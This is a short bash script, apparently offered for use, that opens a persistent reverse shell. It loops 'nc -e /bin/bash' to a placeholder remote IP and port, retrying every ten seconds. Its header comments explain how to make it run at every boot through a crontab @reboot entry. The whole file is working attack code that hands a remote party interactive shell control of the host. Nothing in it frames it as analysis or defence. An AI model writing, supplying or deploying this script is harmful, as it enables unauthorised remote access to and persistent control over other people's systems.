#!/bin/bash
## reverse_shell.sh
## Replace with your remote host's IP and desired port.
## chmod +x reverse_shell.sh
## crontab -e
## @reboot /full/path/to/reverse_shell.sh
##
REMOTE_IP="YOUR_REMOTE_IP"
REMOTE_PORT=YOUR_REMOTE_PORT

while true; do
    # The -e flag directs netcat to execute /bin/bash on connection.
    nc -e /bin/bash "$REMOTE_IP" "$REMOTE_PORT"
    # If the connection drops, wait 10 seconds before retrying.
    sleep 10
done
